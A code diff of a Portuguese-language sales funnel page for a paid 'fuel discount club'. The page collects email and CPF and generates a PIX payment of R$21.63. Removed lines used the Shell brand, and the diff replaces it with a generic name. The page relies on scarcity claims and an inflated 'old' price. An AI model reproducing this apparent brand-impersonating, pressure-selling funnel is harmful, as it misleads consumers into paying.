@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Shell – Clube de Descontos em Combustível</title>
+<title>Clube de Descontos em Combustível</title>
 
 <script
   src="https://cdn.utmify.com.br/scripts/utms/latest.js"
@@ -232,7 +232,7 @@ function trackEvent(eventName, data = {}) {
   try {
     // 1. Browser Pixel FBQ
     if (typeof fbq === 'function') {
-      const stdEvents = ['ViewContent', 'Lead', 'InitiateCheckout', 'AddPaymentInfo', 'Purchase'];
+      const stdEvents = ['ViewContent', 'Lead', 'InitiateCheckout', 'AddPaymentInfo'];
       if (stdEvents.includes(eventName)) {
         fbq('track', eventName, data);
       } else {
@@ -305,10 +305,9 @@ function goTo(idx) {
     case 5: trackEvent('Lead', stepData); break; // Lead concluído após enviar contato
     case 6: trackEvent('ViewResult', stepData); break;
     case 7: trackEvent('ViewSecret', stepData); break;
-    case 8: trackEvent('InitiateCheckout', { content_name: 'Oferta_Shell', value: 21.63, currency: 'BRL' }); break;
+    case 8: trackEvent('InitiateCheckout', { content_name: 'Analise Seg', value: 21.63, currency: 'BRL' }); break;
     case 9: trackEvent('AddPaymentInfo_CPF', stepData); break;
     case 10: trackEvent('AddPaymentInfo', { content_name: 'Gerando_PIX', value: 21.63, currency: 'BRL' }); break;
-    case 11: trackEvent('Purchase', { content_name: 'Acesso_Shell', value: 21.63, currency: 'BRL' }); break; // Purchase ao gerar PIX
   }
 }
 
@@ -546,7 +545,7 @@ function s7(s){
     <div class="card">
       <div class="bens">
         <div class="ben"><div class="bico">🚫</div><div>Não disponível para o público geral</div></div>
-        <div class="ben"><div class="bico">✅</div><div>Exclusivo para membros do Shell</div></div>
+        <div class="ben"><div class="bico">✅</div><div>Exclusivo para membros do Clube</div></div>
         <div class="ben"><div class="bico">🔄</div><div>Novos postos e descontos adicionados toda semana</div></div>
       </div>
     </div>
@@ -560,7 +559,7 @@ function s7(s){
 function s8(s){
   s.innerHTML=`<div class="box">
     <div class="tag"><span class="dot"></span>Oferta exclusiva</div>
-    <h1>Ative seu acesso ao <em>Shell – Clube de Descontos em Combustível</em></h1>
+    <h1>Ative seu acesso ao <em>Clube de Descontos em Combustível</em></h1>
     <div class="card price-card">
       <div class="p-old">Acesso avulso: R$ 49,90</div>
       <div class="p-new"><sup>R$</sup>21<sub>,63</sub></div>
@@ -684,7 +683,7 @@ function s11(s){
       <span id="stxt">Aguardando pagamento...</span>
     </div>
     <div class="card" style="text-align:center">
-      <p style="font-size:12.5px;color:var(--muted)">Após o pagamento, seu acesso ao <b style="color:var(--fuel)">Shell</b> será liberado automaticamente.<br>Verifique o e-mail <b>${state.email}</b>.</p>
+      <p style="font-size:12.5px;color:var(--muted)">Após o pagamento, seu acesso ao <b style="color:var(--fuel)">Clube</b> será liberado automaticamente.<br>Verifique o e-mail <b>${state.email}</b>.</p>
     </div>
     <div style="font-size:11px;color:var(--muted);text-align:center">ID: ${txid}</div>
   </div>`;
